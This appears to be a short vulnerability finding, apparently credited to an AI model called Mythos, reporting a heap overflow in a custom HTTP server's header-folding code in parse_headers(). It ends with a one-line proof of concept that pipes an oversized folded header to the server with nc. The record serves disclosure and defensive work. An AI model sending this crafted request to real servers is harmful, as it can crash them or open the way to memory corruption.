title: Heap overflow in custom HTTP header fold
description: Mythos traced request header folding into a fixed heap buffer. An attacker-controlled header line is copied without checking remaining capacity.
discovery: The model walked parse_headers(), noticed the fold path reused dst without shrinking remaining, and confirmed with ASAN after a crafted request.
poc:
printf 'GET / HTTP/1.1
Host: x
X-Fold: AAAA... (8k)
	BBBB

' | nc $HOST 8080  # ASAN heap-buffer-overflow in parse_headers
